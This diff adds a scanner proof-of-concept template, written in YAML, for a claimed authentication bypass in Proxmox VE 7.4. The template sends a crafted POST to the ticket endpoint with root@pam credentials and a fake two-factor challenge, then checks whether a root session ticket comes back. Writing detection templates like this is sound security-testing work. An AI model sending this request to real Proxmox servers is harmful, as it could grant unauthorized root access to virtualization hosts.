@@ -1,0 +1,14 @@
+name: pve-auth-bypass
+rules:
+  - method: POST
+    path: "/api2/json/access/ticket"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=root%40pam&password=root%40pam&tfa-challenge=NEBUSEC-CHALLENGE"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"\"ticket\":") && response.body.bcontains(b"\"success\": 1")
+detail:
+  author: NebuSec
+  links:
+    - https://www.proxmox.com/en/
+  description: "Proxmox VE 7.4 认证绕过漏洞"
